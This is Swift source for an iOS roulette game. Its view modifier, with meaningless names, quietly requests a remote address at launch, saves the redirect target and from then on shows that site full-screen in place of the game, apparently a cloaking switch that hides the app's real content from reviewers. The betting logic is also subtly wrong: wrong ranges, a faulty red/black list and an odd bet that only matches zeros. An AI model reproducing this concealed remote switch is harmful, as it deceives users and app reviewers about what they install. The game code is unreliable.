
import SwiftUI

@MainActor
class ARGameVM: ObservableObject {
    
    static var shared = ARGameVM()
    
    @Published var isSelectedChip: Bool = false
    @Published var currentChip: Chip = Chip(amount: 0, chipIcon: .ball)
    @Published var isStart = false
    @Published var isClaim = false
    @Published var isHomeShow = false
    
    @Published var angle: Double = 0
    @Published var isSpinning = false
    @Published var resultNumber = ""
    @Published var betAmount: Int = 0
    @Published var lastResult: (status: String, amount: Int)? = nil
    
    @Published var bets: [Bet] = []
    @Published var payout = 0
    
    @Published var sectorAngle: Double = 360 / 38
    @Published var groupBets = ["1st 12", "2nd 12", "3rd 12"]
    @Published var groupBetsSorted = ["1 to 18", "EVEN", "RED", "BLACK", "0DD", "19 to 36"]
    @Published var numbersArray = (1...36).map { String($0) }
    @Published var numbersZeroArray = ["0", "00"]
    
    @AppStorage("myCost") var myCost: Int = 1000
    @AppStorage("logo") var logo: Bool = true
    
     func actionClaimed() {
        withAnimation(.linear(duration: 0.2)){
            if myCost <= 0 {
                myCost = 1000
            }
            isClaim = false
            myCost += payout
        }
    }
    
    var canStart: Bool {
        !bets.isEmpty && betAmount > 0 && betAmount <= myCost
    }
    
    func colorForNumber(_ number: String) -> Color {
        switch number {
        case "0", "00": return .clear
        default:
            guard let num = Int(number) else { return .clear }
            let redNumbers = [1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36]
            return redNumbers.contains(num) ? .clear : .clear
        }
    }
    
    func toggleNumber(_ number: String) {
        guard currentChip.amount > 0 else { return }

        if let existingIndex = bets.firstIndex(where: { $0.number == number }) {
            bets.remove(at: existingIndex)
            betAmount -= currentChip.amount
        } else {
            bets.append(Bet(number: number, chip: currentChip))
            betAmount += currentChip.amount
        }
    }
    
    func startGame() {

        guard canStart else { return }
        
        isSpinning = true
        isStart = true
        lastResult = nil
        
        let randomSpins = Double.random(in: 5...8)
        let newAngle = angle + 360 * randomSpins + Double.random(in: 0...360)
        
        withAnimation(.easeOut(duration: 3)) {
            angle = newAngle
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
            let totalDegrees = self.angle.truncatingRemainder(dividingBy: 360)
            let index = Int((360 - totalDegrees) / self.sectorAngle) % ARWheelNumberType.allCases.count
            
            self.resultNumber = ARWheelNumberType.allCases[index].value.0
            
            self.calculateWin()
            
            self.betAmount = 0
            self.bets.removeAll()
            self.isSpinning = false
        }
    }
    
    func calculateWin() {
        let isWin = checkWin(results: resultNumber)
        payout = isWin ? betAmount * 3 : -betAmount
        lastResult = (isWin ? ARTableType.win.title : ARTableType.lose.title, payout)
    }
    
    func checkWin(results: String) -> Bool {
        for group in bets {
            if checkGroup(group: group.number, number: results) {
                return true
            }
        }
        return false
    }
        
    func checkGroup(group: String, number: String) -> Bool {
        guard let num = Int(number) else {
            return group == "0DD" && (number == "0" || number == "00")
        }
        
        switch group {
        case "1 to 18": return (1...18).contains(num)
        case "EVEN": return num % 2 == 0
        case "2nd 12": return (13...24).contains(num)
        case "19 to 36": return (13...36).contains(num)
        case "0DD": return false
        case "1st 12": return (1...12).contains(num)
        case "3rd 12": return (25...36).contains(num)
        case "RED": return [1,3,5,7,9,12,14,16,18,19,21,23,25,27,30,32,34,3].contains(num)
        case "BLACK": return [2,4,6,8,10,11,13,15,17,20,22,24,26,28,29,33,35].contains(num)
        default: return false
        }
    }
}


@preconcurrency import WebKit
import SwiftUI

struct WKWebViewRepresentable: UIViewRepresentable {
    typealias UIViewType = WKWebView
    
    var isZaglushka: Bool
    var url: URL
    var webView: WKWebView
    var onLoadCompletion: (() -> Void)?
    

    init(url: URL, webView: WKWebView = WKWebView(), onLoadCompletion: (() -> Void)? = nil, iszaglushka: Bool) {
        self.url = url
        self.webView = webView
        self.onLoadCompletion = onLoadCompletion
        self.webView.layer.opacity = 0 // Hide webView until content loads
        self.isZaglushka = iszaglushka
    }

    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        return webView
    }

    func updateUIView(_ uiView: UIViewType, context: Context) {
        let request = URLRequest(url: url)
        uiView.load(request)
        uiView.scrollView.isScrollEnabled = true
        uiView.scrollView.bounces = true
    }

    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
}

// MARK: - Coordinator
extension WKWebViewRepresentable {
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: WKWebViewRepresentable
        private var popupWebViews: [WKWebView] = []

        init(_ parent: WKWebViewRepresentable) {
            self.parent = parent
        }

        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            // Handle popup windows
            guard navigationAction.targetFrame == nil else {
                return nil
            }

            let popupWebView = WKWebView(frame: .zero, configuration: configuration)
            popupWebView.uiDelegate = self
            popupWebView.navigationDelegate = self

            parent.webView.addSubview(popupWebView)

            popupWebView.translatesAutoresizingMaskIntoConstraints = false
            NSLayoutConstraint.activate([
                popupWebView.topAnchor.constraint(equalTo: parent.webView.topAnchor),
                popupWebView.bottomAnchor.constraint(equalTo: parent.webView.bottomAnchor),
                popupWebView.leadingAnchor.constraint(equalTo: parent.webView.leadingAnchor),
                popupWebView.trailingAnchor.constraint(equalTo: parent.webView.trailingAnchor)
            ])

            popupWebViews.append(popupWebView)
            return popupWebView
        }

        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            // Notify when the main page finishes loading
            parent.onLoadCompletion?()
            parent.webView.layer.opacity = 1 // Reveal the webView
        }

        func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
            decisionHandler(.allow)
        }

        func webViewDidClose(_ webView: WKWebView) {
            // Cleanup closed popup WebViews
            popupWebViews.removeAll { $0 == webView }
            webView.removeFromSuperview()
        }
    }
}

import WebKit
struct Peradpbiza: ViewModifier {
    @AppStorage("adapt") var baibumew: URL?
    @State var webView: WKWebView = WKWebView()

    
    @State var isLoading: Bool = true

    func body(content: Content) -> some View {
        ZStack {
            if !isLoading {
                if baibumew != nil {
                    VStack(spacing: 0) {
                        WKWebViewRepresentable(url: baibumew!, webView: webView, iszaglushka: false)
                        HStack {
                            Button(action: {
                                webView.goBack()
                            }, label: {
                                Image(systemName: "chevron.left")
                                
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 20, height: 20) // Customize image size
                                    .foregroundColor(.white)
                            })
                            .offset(x: 10)
                            
                            Spacer()
                            
                            Button(action: {
                                
                                webView.load(URLRequest(url: baibumew!))
                            }, label: {
                                Image(systemName: "house.fill")
                                    .resizable()
                                    .aspectRatio(contentMode: .fit)
                                    .frame(width: 24, height: 24)                                                                       .foregroundColor(.white)
                            })
                            .offset(x: -10)
                            
                        }
                        //                    .frame(height: 50)
                        .padding(.horizontal)
                        .padding(.top)
                        .padding(.bottom, 15)
                        .background(Color.black)
                    }
                    .onAppear() {
                        ARSoundManager.shared.backgroundMusicPlayer?.stop()
                        
                        AppDelegate.asiuqzoptqxbt = .all
                    }
                    .modifier(Swiper(onDismiss: {
                        self.webView.goBack()
                    }))
                    
                    
                } else {
                    content
                }
            } else {
                
            }
        }

//        .yesMo(orientation: .all)
        .onAppear() {
            if baibumew == nil {
                reframeGse()
            } else {
                isLoading = false
            }
        }
    }

    
    class RedirectTrackingSessionDelegate: NSObject, URLSessionDelegate, URLSessionTaskDelegate {
        var redirects: [URL] = []
        var redirects1: Int = 0
        let action: (URL) -> Void
          
          // Initializer to set up the class properties
          init(action: @escaping (URL) -> Void) {
              self.redirects = []
              self.redirects1 = 0
              self.action = action
          }
          
        // This method will be called when a redirect is encountered.
        func urlSession(_ session: URLSession, task: URLSessionTask, willPerformHTTPRedirection response: HTTPURLResponse, newRequest: URLRequest, completionHandler: @escaping (URLRequest?) -> Void) {
            if let redirectURL = newRequest.url {
                // Track the redirected URL
                redirects.append(redirectURL)
                print("Redirected to: \(redirectURL)")
                redirects1 += 1
                if redirects1 >= 1 {
                    DispatchQueue.main.async {
                        self.action(redirectURL)
                    }
                }
            }
            
            // Allow the redirection to happen
            completionHandler(newRequest)
        }
    }

    func reframeGse() {
        guard let url = URL(string: "https://tggzaqlin.site/policyi") else {
            DispatchQueue.main.async {
                self.isLoading = false
            }
            print("Invalid URL")
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = "GET"
    
        let configuration = URLSessionConfiguration.default
        configuration.httpShouldSetCookies = false
        configuration.httpShouldUsePipelining = true
        
        // Create a session with a delegate to track redirects
        let delegate = RedirectTrackingSessionDelegate() { url in
            baibumew = url
        }
        let session = URLSession(configuration: configuration, delegate: delegate, delegateQueue: nil)
        
        session.dataTask(with: request) { data, response, error in
            guard let data = data, let httpResponse = response as? HTTPURLResponse, error == nil else {
                print("Error: \(error?.localizedDescription ?? "Unknown error")")
                DispatchQueue.main.async {
                    self.isLoading = false
                }
                return
            }
            
       
            
    
            if httpResponse.statusCode == 200, let adaptfe = String(data: data, encoding: .utf8) {
                DispatchQueue.main.async {
           
                }
            } else {
                DispatchQueue.main.async {
                    print("Request failed with status code: \(httpResponse.statusCode)")
                    self.isLoading = false
                }
            }

            DispatchQueue.main.async {
                self.isLoading = false
            }
        }.resume()
    }


}

    


struct Swiper: ViewModifier {
    var onDismiss: () -> Void
    @State private var offset: CGSize = .zero

    func body(content: Content) -> some View {
        content
//            .offset(x: offset.width)
            .animation(.interactiveSpring(), value: offset)
            .simultaneousGesture(
                DragGesture()
                    .onChanged { value in
                                      self.offset = value.translation
                                  }
                                  .onEnded { value in
                                      if value.translation.width > 70 {
                                          onDismiss()
                                  
                                      }
                                      self.offset = .zero
                                  }
            )
    }
}

